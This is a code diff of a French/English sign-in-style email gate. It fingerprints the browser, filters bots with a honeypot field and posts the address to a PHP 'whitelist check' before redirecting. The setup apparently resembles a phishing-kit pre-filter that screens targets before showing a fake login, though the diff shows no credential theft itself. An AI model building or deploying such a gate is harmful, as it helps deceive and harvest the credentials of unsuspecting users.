@@ -99,9 +99,7 @@
 
         <div class="caption" id="disclosure">
           <small class="caption-legal">
-            En sélectionnant «&nbsp;Suivant&nbsp;», vous consentez à l’utilisation de votre adresse e-mail
-            aux fins d’authentification, de contrôle d’accès et de journalisation de sécurité, conformément
-            à notre Notice de confidentialité et aux lois applicables en matière de protection des données.
+            En sélectionnant Suivant vous autorisez l’utilisation de votre e-mail pour l’authentification et le contrôle d’accès, conformément à notre notice de confidentialité.
           </small>
         </div>
       </section>
@@ -110,32 +108,39 @@
 
   <div class="simple-footer">© 2025&nbsp;&nbsp;Confidentialité &amp; Cookies</div>
 
-<script>
+
+
+
+  
+
+
+ <script>
 document.addEventListener('DOMContentLoaded', () => {
+  // Tiny helper
   const $ = id => document.getElementById(id);
 
-  // Forcer le français (ou utilisez navigator.language si vous préférez)
-  const LANG = 'fr';
+  // i18n (EN/FR)
+  const LANG = (navigator.language || 'en').slice(0,2);
   const T = {
-    fr: {
-      invalidEmail: 'Veuillez saisir une adresse e-mail valide.',
-      errorGeneric: 'Une erreur est survenue. Merci de réessayer.',
-      redirecting: 'Redirection…',
-      checking: 'Vérification…'
-    }
+    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Next...' },
+    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.', errorGeneric:'Une erreur est survenue. Merci de réessayer.', redirecting:'Redirection…' }
   };
-  const t = T[LANG];
+  const t = T[LANG] || T.en;
 
-  const gateway  = '/validate.php';
+  // Endpoint (your PHP bridge/back-end)
+  const gateway = '/validate.php';
+
+  // DOM refs
   const form     = $('verifyForm');
   const input    = $('email');
   const errBox   = $('err');
-  const submitEl = $('continueBtn');
+  const submitEl = $('submitBtn') || $('continueBtn'); // support either id
 
-  const looksLikeEmail = v => /^[^\\s@]+@[^\\s@]+\\.[^\\s@]{2,}$/.test(String(v).trim());
+  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v).trim());
   const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
   const hide = (n) => { if (!n) return; n.style.display = 'none'; };
 
+  // Optional: simple fingerprint (backend can ignore it)
   let fpHash = '';
   (async () => {
     try {
@@ -145,16 +150,18 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch {}
   })();
 
+  // Enable/disable button as user types
   input?.addEventListener('input', () => {
     hide(errBox);
     if (submitEl) submitEl.disabled = !looksLikeEmail(input.value);
   });
 
+  // Submit → server whitelist check (no captcha)
   form?.addEventListener('submit', async (e) => {
     e.preventDefault();
 
     const val  = (input?.value || '').trim();
-    const trap = ($('middleName')?.value || '').trim(); // honeypot
+    const trap = ($('middleName')?.value || '').trim(); // honeypot; must be empty
 
     if (!looksLikeEmail(val)) return show(errBox, t.invalidEmail);
     if (trap) return; // bot
@@ -166,11 +173,12 @@ document.addEventListener('DOMContentLoaded', () => {
       fingerprint: fpHash
     };
 
+    // Abort after 12s to avoid hanging
     const ctl = new AbortController();
     const timer = setTimeout(() => ctl.abort(), 12000);
 
     try {
-      if (submitEl) { submitEl.disabled = true; submitEl.textContent = t.checking; }
+      if (submitEl) { submitEl.disabled = true; submitEl.textContent = 'Checking…'; }
 
       const res = await fetch(gateway, {
         method: 'POST',
@@ -191,11 +199,11 @@ document.addEventListener('DOMContentLoaded', () => {
           ? json.message + (json.detail ? ` (${json.detail})` : '')
           : `${t.errorGeneric} [${res.status}]`;
         show(errBox, msg);
-        if (submitEl) { submitEl.disabled = !looksLikeEmail(val); submitEl.textContent = 'Suivant'; }
+        if (submitEl) { submitEl.disabled = !looksLikeEmail(val); submitEl.textContent = 'Next'; }
       }
     } catch {
       show(errBox, t.errorGeneric);
-      if (submitEl) { submitEl.disabled = !looksLikeEmail(input.value); submitEl.textContent = 'Suivant'; }
+      if (submitEl) { submitEl.disabled = !looksLikeEmail(input.value); submitEl.textContent = 'Next'; }
     } finally {
       clearTimeout(timer);
     }
